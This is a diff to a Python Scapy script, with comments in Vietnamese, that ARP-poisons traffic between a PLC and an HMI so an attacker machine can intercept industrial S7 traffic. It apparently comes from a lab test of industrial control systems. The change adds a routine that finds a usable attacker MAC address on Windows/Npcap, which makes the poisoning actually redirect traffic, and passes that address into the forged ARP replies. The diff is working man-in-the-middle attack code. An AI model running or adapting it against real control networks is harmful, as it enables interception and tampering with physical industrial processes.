@@ -118,10 +118,48 @@ def get_mac(ip):
         return None
 
 
-# ── ARP Poison (giong het test_mitm_s7_spoof.py, da co restore) ──────────────
-def arp_poison(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
-    attacker_mac = get_if_hwaddr(iface)
+def _is_null_mac(mac):
+    return (not mac) or mac.lower() in ("00:00:00:00:00:00", "")
 
+
+def resolve_attacker_mac(iface, plc_ip):
+    """MAC that at attacker de dung lam hwsrc trong ARP poison.
+
+    get_if_hwaddr(iface) tren interface \\Device\\NPF_{...} cua Windows/Npcap
+    hay tra 00:00:00:00:00:00 (du sniff van chay) -- neu dung lam hwsrc thi
+    poison quang bao MAC RONG => nan nhan khong gui traffic ve dung may attacker
+    => poison KHONG chuyen huong (0 goi). Thu nhieu cach, tra MAC hop le dau tien.
+    """
+    # 1. get_if_hwaddr thang
+    try:
+        mac = get_if_hwaddr(iface)
+        if not _is_null_mac(mac):
+            return mac, "get_if_hwaddr"
+    except Exception:
+        pass
+    # 2. Windows: khop interface theo IP attacker (cung subnet PLC)
+    try:
+        from scapy.all import conf
+        _, attacker_ip, _ = conf.route.route(plc_ip)
+        from scapy.arch.windows import get_windows_if_list
+        for i in get_windows_if_list():
+            if attacker_ip in (i.get("ips") or []) and not _is_null_mac(i.get("mac")):
+                return i["mac"], f"windows_if_list(ip={attacker_ip})"
+    except Exception:
+        pass
+    # 3. conf.iface.mac
+    try:
+        from scapy.all import conf
+        mac = getattr(conf.iface, "mac", None)
+        if not _is_null_mac(mac):
+            return mac, "conf.iface.mac"
+    except Exception:
+        pass
+    return None, "FAILED"
+
+
+# ── ARP Poison (giong het test_mitm_s7_spoof.py, da co restore) ──────────────
+def arp_poison(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, attacker_mac):
     poison_to_hmi = Ether(dst=hmi_mac) / ARP(
         op=2, pdst=hmi_ip, hwdst=hmi_mac,
         psrc=plc_ip, hwsrc=attacker_mac
@@ -366,10 +404,13 @@ def main():
         ok(f"PLC MAC : {plc_mac}")
         ok(f"HMI MAC : {hmi_mac}")
 
-        ATTACKER_MAC = get_if_hwaddr(iface)
+        ATTACKER_MAC, mac_method = resolve_attacker_mac(iface, plc_ip)
         PLC_MAC = plc_mac
         HMI_MAC = hmi_mac
-        info(f"ATTACKER_MAC={ATTACKER_MAC}  (guard so khop Ether.src voi PLC/HMI MAC o tren)")
+        info(f"ATTACKER_MAC={ATTACKER_MAC}  (resolve qua: {mac_method})")
+        if _is_null_mac(ATTACKER_MAC):
+            warn("ATTACKER_MAC RONG/khong resolve duoc -> ARP poison se quang bao MAC rong -> KHONG chuyen huong duoc. "
+                 "Kiem tra CAPTURE_IFACE co dung card Intel Ethernet (IP 192.168.210.32) khong.")
 
         if spoof_mode:
             # Sole-forwarder: IP forwarding cua OS PHAI TAT (neu khong -> forward kep).
@@ -387,7 +428,7 @@ def main():
 
         arp_thread = threading.Thread(
             target=arp_poison,
-            args=(plc_mac, hmi_mac, plc_ip, hmi_ip, iface),
+            args=(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, ATTACKER_MAC),
             daemon=True
         )
         arp_thread.start()
